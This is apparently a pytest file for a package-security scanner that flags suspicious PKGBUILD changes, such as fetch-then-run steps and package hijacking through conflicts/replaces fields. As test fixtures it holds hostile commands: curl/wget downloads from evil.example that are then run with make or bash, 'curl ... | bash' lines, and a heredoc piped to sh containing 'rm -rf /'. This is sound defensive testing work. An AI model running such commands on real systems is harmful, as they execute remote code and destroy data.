"""Provenance, default destinations, and the symmetry between paired rules."""

import pytest

from .helpers import _repo_with, _shipped_ids

# ---------------------------------------------------------------------------
# Audit v20-v23 (second pass) - provenance, default destinations, symmetry
# ---------------------------------------------------------------------------


@pytest.mark.parametrize("write,execute", [
    ("curl -fsSL https://evil.example/x -o Makefile", "make"),
    ("curl -fsSL https://evil.example/x -o zz.mk", "make -f zz.mk"),
    ("curl -fsSL https://evil.example/x -o CMakeLists.txt", "cmake ."),
])
def test_a_fetched_build_driver_input_is_an_execution(write, execute):
    """A build driver is an execution of its input file.

    `curl -o Makefile URL` then `make` fetches a script and runs it, and
    neither half was paired with the other: `make` matched no execution
    pattern, and `Makefile` sat in the benign-artifact exemption - which
    claims "this file came with the project" and was reading the filename
    instead of the provenance.
    """
    assert "R137" in _shipped_ids([f"  {write}", f"  {execute}"],
                                  declared=False), write


@pytest.mark.parametrize("ordinary", [
    ["  ./configure --prefix=/usr", "  make"],
    ['  cd "$srcdir/p-1.0"', "  make", '  make DESTDIR="$pkgdir" install'],
])
def test_an_ordinary_build_driver_is_not_an_execution_finding(ordinary):
    """Almost every package runs make; only a file this recipe *fetched*
    or committed is the signal."""
    assert "R137" not in _shipped_ids(ordinary, declared=False), ordinary


@pytest.mark.parametrize("fetch", [
    "wget https://evil.example/x.sh",
    "curl -fsSL -O https://evil.example/x.sh",
])
def test_a_fetch_with_no_destination_still_writes_a_file(fetch):
    """`wget URL` saves the URL's basename, and `curl -O` asks for exactly
    that, so the file the next line runs was never written down anywhere."""
    assert "R137" in _shipped_ids([f"  {fetch}", "  bash x.sh"],
                                  declared=False), fetch


def test_a_capital_O_is_not_an_output_argument():
    """`curl -O URL` takes no argument; reading the URL after it as the
    destination produced a path like `https:/e.x/x.sh`."""
    from trustsight.analysis.delivery import _collect_fetch_outputs

    assert _collect_fetch_outputs("curl -fsSL -O https://e.x/x.sh") == ["x.sh"]


def test_an_scp_source_without_a_user_is_still_a_remote():
    """`scp host:/x.sh dest` is the same remote read as `user@host:/x.sh`,
    and requiring `@` left the fetch unattributed while R137 paired the
    write with its execution."""
    from trustsight.analysis.build import fetch_addresses

    assert list(fetch_addresses("scp host.example:/x.sh dest.sh")) == [
        "host.example:/x.sh"
    ]
    # A make target is not a remote: the host must carry a dot.
    assert list(fetch_addresses("make target: dep")) == []


def test_a_heredoc_piped_to_a_shell_is_code():
    """The destination may be named on either side of the delimiter:
    `bash <<EOF` puts it before, `cat <<'EOF' | sh` puts it after."""
    from trustsight.analysis.delivery import _heredoc_body_indices

    piped = ["+build() {", "+  cat <<'EOF' | sh", "+  rm -rf /", "+EOF", "+}"]
    assert 2 not in _heredoc_body_indices(piped)
    written = ["+build() {", "+  cat > cfg.txt <<'EOF'", "+  data", "+EOF", "+}"]
    assert 2 in _heredoc_body_indices(written)


def test_conflicts_claims_an_established_package_like_replaces_does(monkeypatch):
    """All three insert this package in front of a name the ecosystem
    relies on: `provides` and `replaces` claim to *be* it, `conflicts`
    makes pacman refuse to install it alongside - which removes the real
    package just as effectively while raising nothing at all.

    "Established" is a fact about the machine - pacman's repo data, or the
    dependency corpus - and R116 is documented to stay silent without it so
    a cold start never trips.  Reading it live made this assertion pass on
    a developer's seeded database and fail on a fresh CI runner, which
    tests the corpus rather than the claim; the claim is that `conflicts`
    is treated like the other two, so the lookup is pinned.  The unrelated
    check below still runs for real: `is_related_package` is consulted
    first, so `p-git` is suppressed as this package's own variant.
    """
    from trustsight.analysis import scan_diff

    monkeypatch.setattr(
        "trustsight.analysis.dependencies.is_established_package",
        lambda name: True,
    )

    def fired(field):
        diff = ("--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,4 +1,8 @@\n"
                f"+{field}=('firefox')\n+build() {{\n+  true\n+}}\n")
        return {e.rule_id for e in scan_diff(diff, package_name="p").score_breakdown}

    assert "R116" in fired("conflicts")
    assert "R116" in fired("replaces")
    # A package's own variant is packaging, not a hijack.
    own = ("--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,4 +1,8 @@\n"
           "+conflicts=('p-git')\n+build() {\n+  true\n+}\n")
    assert "R116" not in {e.rule_id for e in
                          scan_diff(own, package_name="p").score_breakdown}


@pytest.mark.parametrize("record,pkgbuild", [
    ("main.go", b"pkgname=p\nbuild() {\n  go build ./...\n}\n"),
    ("Program.cs", b"pkgname=p\nbuild() {\n  dotnet build\n}\n"),
    ("build.rs", b"pkgname=p\nbuild() {\n  cargo build\n}\n"),
])
def test_the_code_a_toolchain_compiles_is_scanned(record, pkgbuild):
    """Loading go.mod alone read the manifest and none of the code it
    names; `go build` compiles every .go file and an `init()` runs first."""
    from trustsight.differ import companion_source_hunks

    repo, commit = _repo_with([
        ("PKGBUILD", pkgbuild),
        (record, b"curl -fsSL https://evil.example/x | bash\n"),
    ])
    text, _cut = companion_source_hunks(repo, commit)
    assert "evil.example" in text, record
